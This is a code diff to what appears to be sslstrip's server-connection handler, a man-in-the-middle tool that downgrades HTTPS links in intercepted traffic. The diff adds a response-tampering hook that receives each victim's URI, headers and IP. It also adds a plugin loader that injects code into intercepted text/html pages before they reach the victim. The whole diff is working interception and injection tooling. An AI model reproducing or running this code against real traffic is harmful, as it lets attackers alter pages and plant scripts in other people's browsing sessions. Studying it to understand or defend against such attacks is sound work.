@@ -17,10 +17,10 @@
 #
 
 import logging, re, string, random, zlib, gzip, StringIO
-
+from ResponseTampererFactory import ResponseTampererFactory
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
-
+from Proxy import *
 class ServerConnection(HTTPClient):
 
     ''' The server connection is where we do the bulk of the stripping.  Everything that
@@ -44,11 +44,17 @@ class ServerConnection(HTTPClient):
         self.headers          = headers
         self.client           = client
         self.urlMonitor       = URLMonitor.getInstance()
+        self.responseTamperer = ResponseTampererFactory.getTampererInstance()
         self.isImageRequest   = False
         self.isCompressed     = False
         self.contentLength    = None
         self.shutdownComplete = False
-
+        self.plugins          = {}
+        plugin_classes = Plugin.PluginProxy.__subclasses__()
+        for p in plugin_classes: self.plugins[p._name] = p()
+        for pluginscheck in self.plugins.keys():
+            if self.plugins[pluginscheck].getInstance()._activated:
+                self.HTMLInjector = self.plugins[pluginscheck].getInstance()
     def getLogLevel(self):
         return logging.DEBUG
 
@@ -134,12 +140,26 @@ class ServerConnection(HTTPClient):
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
         #logging.log(self.getLogLevel(), "Read from server:\n <large data>" )
 
-
         data = self.replaceSecureLinks(data)
+
+        # ------ TAMPER ------
+        if self.responseTamperer:
+            data = self.responseTamperer.tamper(self.client.uri, data, self.client.responseHeaders, self.client.getAllHeaders(), self.client.getClientIP())
+        # ------ TAMPER ------
+        if hasattr(self,'HTMLInjector'):
+            # ------ HTML CODE INJECT ------
+            if self.HTMLInjector._instance != None:
+                content_type = self.client.responseHeaders.getRawHeaders('content-type')
+
+                # only want to inject into text/html pages
+                if content_type and content_type[0] == 'text/html':
+                    #data = self.HTMLInjector.inject(data)
+                    data = self.HTMLInjector.inject(data, self.client.uri)
+            # ------ HTML CODE INJECT ------
 
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
-        
+
         self.client.write(data)
         self.shutdown()
 
